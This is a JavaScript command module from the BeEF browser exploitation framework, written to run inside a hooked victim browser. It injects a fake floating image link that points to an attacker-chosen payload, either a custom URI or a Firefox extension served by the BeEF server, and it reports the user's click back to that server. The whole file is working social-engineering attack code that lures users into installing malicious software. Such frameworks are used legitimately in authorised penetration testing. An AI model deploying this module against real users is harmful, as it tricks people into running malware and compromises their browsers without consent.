//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
	// Module Configurations
  	var image				= "<%== @image %>";
    var payload_type		= "<%== @payload %>";
    var payload_uri			= "<%== @payload_uri %>";

    var beef_root			= beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port;
    var payload				= "";

	// Payload Configuration
    switch (payload_type) {
        case "Custom_Payload":
			payload = payload_uri;
			break;
        case "Firefox_Extension":
            payload = beef_root + "/api/ipec/ff_extension";
            break;
        default:
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=payload not selected');
            break;
    }

  	// Create DIV
    var fakediv = document.createElement('div');
	fakediv.setAttribute('id', 'fakeDiv');
	fakediv.setAttribute('style', 'position:absolute; top:20%; left:30%; z-index:51;');
	fakediv.setAttribute('align', 'center');
	document.body.appendChild(fakediv);
	
	// window.open is very useful when using data URI vectors and the IFrame/Object tag
	// also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
    fakediv.innerHTML = "<a href=\"" + payload + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";

    $j("#splash").click(function () {
      $j(this).hide();
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=user has clicked');
    });
});
